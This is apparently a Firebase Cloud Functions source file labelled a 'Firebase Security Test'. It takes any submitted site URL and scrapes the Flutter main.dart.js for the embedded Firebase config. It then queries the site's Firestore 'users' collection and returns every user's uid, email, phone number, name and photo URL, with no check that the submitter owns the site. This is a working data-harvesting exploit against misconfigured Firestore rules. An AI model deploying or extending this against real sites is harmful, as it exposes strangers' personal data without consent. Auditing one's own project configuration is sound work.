import * as functions from "firebase-functions";
import { initializeApp } from "firebase/app";
import { getFirestore, collection, getDocs } from "firebase/firestore/lite";
import axios, { AxiosResponse } from "axios";
// import { auth } from "firebase-admin";

// Start writing functions
// https://firebase.google.com/docs/functions/typescript
//
export const helloWorld = functions.https.onRequest((request, response) => {
  functions.logger.info("Hello logs!", { structuredData: true });
  response.send("Hello from Firebase!");
});

export const test = functions.https.onRequest((request, response) => {
  functions.logger.info("Hello logs!", { structuredData: true });
  response.send(`
    <html>
        <head>
            <title>Firebase Security Test</title>
        </head>
        <body>
        <div style="margin: 2em;">

            <h1>
                Enter your site url:
            </h1>
            <form action="https://us-central1-flutter-flow-korea.cloudfunctions.net/run" method="POST">
                <input type="text" name="url" size="48" />
                <input type="submit" value="Submit" />
            </form>
            </div>
        </body>
    </html>
  `);
});

export const run = functions.https.onRequest(async (request, response) => {
  // / get main.dart
  const url = request.body.url;
  let res: AxiosResponse;
  try {
    res = await axios.get(url);
  } catch (e) {
    console.log("error on getting the site: axios.get(" + url + ")");
    console.log(e);
    // response.send("error on axios.get(url)");
    throw e;
  }

  const html = res.data;

  const regex = /https:.*main\.dart\.js/gm;

  const jsUrl: string = regex.exec(html) as any;
  try {
    res = await axios.get(jsUrl);
  } catch (e) {
    console.log("error on getting the main.dart.js: axios.get(" + jsUrl + ")");
    console.log(e);
    // return response.send("error on axios.get(url)");
    throw e;
  }

  //   console.log(res.data);

  const js = res.data;

  const securyRegex = /\(".*\.appspot.com"\)\)/gm;
  const securyInfo: string = securyRegex.exec(js) as any;
  console.log(securyInfo);

  const parts = securyInfo
    .toString()
    .replace(/\"/g, "")
    .replace(/\(/g, "")
    .replace(/\)/g, "")
    .split(",");

  const apiKey = parts[0];
  const appId = parts[1];
  const authDomain = parts[2];
  //   const databaseURL = parts[3];
  //   const messagingSenderId = parts[4];
  const projectId = parts[6];
  //   const storageBucket = parts[7];

  const info = `
    <h1>Firebase Security Test</h1>
    <small>url</small>
    <div>${request.body.url}</div>
    <small>main.dart.js url</div>
    <div>${jsUrl}</div>
    <small>secury info parts</small>
    <div>${securyInfo}</div>
    <div>0 ${parts[0]}</div>
    <div>1 ${parts[1]}</div>
    <div>2 ${parts[2]}</div>
    <div>3 ${parts[3]}</div>
    <div>4 ${parts[4]}</div>
    <div>5 ${parts[5]}</div>
    <div>6 ${parts[6]}</div>
    <div>7 ${parts[7]}</div>
    
    `;

  console.log(info);

  // / parse access
  // Initialize another app
  const app = initializeApp({
    apiKey: apiKey,
    authDomain: authDomain,
    databaseURL: "https://withcenter-test-2-default-rtdb.asia-southeast1.firebasedatabase.app",
    projectId: projectId,
    storageBucket: "withcenter-test-2.appspot.com",
    messagingSenderId: "817502397544",
    appId: appId,
  });

  const db = getFirestore(app);
  const citiesCol = collection(db, "users");
  const citySnapshot = await getDocs(citiesCol);
  const userList = citySnapshot.docs.map((doc) => {
    const data = doc.data();

    return {
      uid: data.uid,
      email: data.email,
      phoneNumber: data.phone_number,
      displayName: data.displa_name,
      photoUrl: data.photoUrl,
    };
  });

  //   console.log(userList);
  response.send(userList);
});
